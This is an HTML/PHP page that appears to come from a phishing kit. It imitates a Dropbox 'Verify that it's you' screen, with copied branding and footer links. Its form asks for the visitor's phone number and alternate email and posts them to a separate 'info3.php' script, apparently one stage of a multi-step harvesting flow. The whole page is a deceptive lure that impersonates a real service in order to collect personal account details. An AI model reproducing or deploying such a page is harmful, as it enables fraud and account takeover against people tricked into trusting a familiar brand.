<html>
<head>
<title>Verify Account</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles2.css">
<link href="images/dropbox-logo.png" rel="shortcut icon">
</head>
<body >
	<div id="wrapper">
		<div class="verify-content top-gap">
			<h3>Verify that it's you</h3>
			<p>It looks like you're signing in to your account from a new location. Confirm your phone number or alternate email below to verify that it's you signing into this account.</p>
		</div>
		<div class="second-wrapper">
			<div class="verify-content top-gap">
				<form method="POST" action="info3.php">

					<div class="fields">
						<div class="confirm-img"><img src="images/gphone.png"></div>
						<div class="confirm-field">
							<span>Enter your phone number</span>
							<input class="confirm" type="text" value="<?echo $_POST ? $_POST['phone']: "";?>" placeholder="Your phone number" name="phone" class="phone">
						</div>
					</div>
						<span class="clearfix"></span>
					<div class="fields">
						<div class="confirm-img"><img src="images/gemail.png"></div>
						<div class="confirm-field">
							<span>Enter your alternate email </span>
							<input class="confirm" type="text" value="<?echo $_POST ? $_POST['alternate_email']: "";?>" placeholder="Alternate email" name="alternate_email" class="alternate">
						</div>
						
					</div>
					<?php 
							echo $phone_error !== "" ? '<div class="error clearfix ">'.$phone_error.'</div>' : ""; 
							echo $email_error !== "" ? '<div class="error clearfix ">'.$email_error.'</div>' : ""; 
						?>
					
					<div style="text-align: center;"><input type="submit" class="rc-button rc-button-submit" id="signIn" value="Submit"></div>
				</form>
			</div>
		</div>
	</div>
	
	<div id="page-prefooter" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; clear: both;">
				&nbsp;</div>
			<footer style="-webkit-font-smoothing: antialiased; box-sizing: border-box; position: absolute;    margin-left: 181px;">
				<div id="page-full-footer" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; clear: both; padding: 0px 0px 120px;">
					<div id="footer-top-margin" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; height: 6em;">
						&nbsp;</div>
					<div id="footer-border" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; width: 990px; height: 0px; margin-bottom: 2em; border-top: 1px solid rgb(208, 212, 217);">
						&nbsp;</div>
					<div class="footer-col" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; display: inline-block; vertical-align: top; max-width: 200px; margin: 15px 45px 20px 15px;">
						<ul style="-webkit-font-smoothing: antialiased; box-sizing: border-box; margin: 0px; padding: 0px;">
							<li class="header" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 13px; margin: 5px 0px; padding: 0px; font-weight: 600; color: rgb(118, 118, 118);">
								Dropbox</li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Install</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Mobile</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Pricing</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Business</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Enterprise</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Tour</a></li>
						</ul>
					</div>
					<div class="footer-col" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; display: inline-block; vertical-align: top; max-width: 200px; margin: 15px 45px 20px 15px;">
						<ul style="-webkit-font-smoothing: antialiased; box-sizing: border-box; margin: 0px; padding: 0px;">
							<li class="header" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 13px; margin: 5px 0px; padding: 0px; font-weight: 600; color: rgb(118, 118, 118);">
								About us</li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Dropbox Blog</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">About</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Branding</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">News</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Jobs</a></li>
						</ul>
					</div>
					<div class="footer-col" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; display: inline-block; vertical-align: top; max-width: 200px; margin: 15px 45px 20px 15px;">
						<ul style="-webkit-font-smoothing: antialiased; box-sizing: border-box; margin: 0px; padding: 0px;">
							<li class="header" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 13px; margin: 5px 0px; padding: 0px; font-weight: 600; color: rgb(118, 118, 118);">
								Support</li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Help Center</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Contact us</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Copyright</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Cookies</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Privacy &amp; Terms</a></li>
						</ul>
					</div>
					<div class="footer-col" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; display: inline-block; vertical-align: top; max-width: 200px; margin: 15px 45px 20px 15px;">
						<ul style="-webkit-font-smoothing: antialiased; box-sizing: border-box; margin: 0px; padding: 0px;">
							<li class="header" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 13px; margin: 5px 0px; padding: 0px; font-weight: 600; color: rgb(118, 118, 118);">
								Community</li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Referrals</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Forum</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;" target="_blank">Twitter</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;" target="_blank">Facebook</a></li>
							<li style="-webkit-font-smoothing: antialiased; box-sizing: border-box; list-style: none; font-size: 11px; margin: 5px 0px; padding: 0px;">
								<a href="#" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; cursor: pointer; outline: none; color: rgb(118, 118, 118); text-decoration: none; font-size: 13px;">Developers</a></li>
						</ul>
					</div>
					<div class="react-locale-selector-wrapper" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; float: right;">
						<div id="component5806589569375156618" style="-webkit-font-smoothing: antialiased; box-sizing: border-box;">
							<div data-reactroot="" id="locale-container" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; position: relative; float: right; margin-top: 20px; margin-right: 16px; margin-bottom: 40px; min-width: 50px; max-width: 200px;">
								<span id="locale-link" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; max-width: 210px; min-width: 50px;"><img alt="" class="sprite sprite_web s_web_globe_gray_20x20" src="https://cfl.dropboxstatic.com/static/images/icons/icon_spacer-vflN3BYt2.gif" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; width: 20px; height: 20px; background-image: url(&quot;/static/images/sprites/web_sprites-vfl5R1Aea.png&quot;); background-repeat: no-repeat; background-position: left -7078px; vertical-align: middle; margin: 0px 4px -6px 0px;" /><button class="button-as-link react-locale-selector-link" style="-webkit-font-smoothing: antialiased; font-family: &quot;Open Sans&quot;, &quot;lucida grande&quot;, &quot;Segoe UI&quot;, arial, verdana, &quot;lucida sans unicode&quot;, tahoma, sans-serif; font-size: 13px; color: rgb(123, 137, 148); font-weight: 600; border-width: 0px; border-style: solid; border-color: initial; width: auto; overflow: visible; outline: 0px; margin: 0px 3px 0px 0px; padding: 0px; cursor: pointer; background-image: none; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; vertical-align: middle;" title="Choose a language"><span data-locale="en" style="-webkit-font-smoothing: antialiased; box-sizing: border-box;">English (United States)</span><img alt="" class="sprite sprite_web s_web_arrow-up-gray" src="https://cfl.dropboxstatic.com/static/images/icons/icon_spacer-vflN3BYt2.gif" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; width: 9px; height: 5px; background-image: url(&quot;/static/images/sprites/web_sprites-vfl5R1Aea.png&quot;); background-repeat: no-repeat; background-position: left -9704px; vertical-align: middle; margin: 0px 0px 2px 5px;" /></button></span></div>
							<div>
								<span style="-webkit-font-smoothing: antialiased; box-sizing: border-box; max-width: 210px; min-width: 50px;"><button class="button-as-link react-locale-selector-link" style="-webkit-font-smoothing: antialiased; font-family: &quot;Open Sans&quot;, &quot;lucida grande&quot;, &quot;Segoe UI&quot;, arial, verdana, &quot;lucida sans unicode&quot;, tahoma, sans-serif; font-size: 13px; color: rgb(123, 137, 148); font-weight: 600; border-width: 0px; border-style: solid; border-color: initial; width: auto; overflow: visible; outline: 0px; margin: 0px 3px 0px 0px; padding: 0px; cursor: pointer; background-image: none; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; vertical-align: middle;" title="Choose a language"><br />
								</button></span></div>
						</div>
					</div>
					<div class="clear" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; clear: both;">
						&nbsp;</div>
				</div>
			</footer>
		</div>
		<div id="ieconsole" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; position: absolute; top: 0px; left: 0px; font-family: Courier;">
			&nbsp;</div>
		<div id="FB_HiddenContainer" style="-webkit-font-smoothing: antialiased; box-sizing: border-box; position: absolute; top: -10000px; width: 0px; height: 0px; left: 0px;">
			&nbsp;</div>
	
</body>
</html>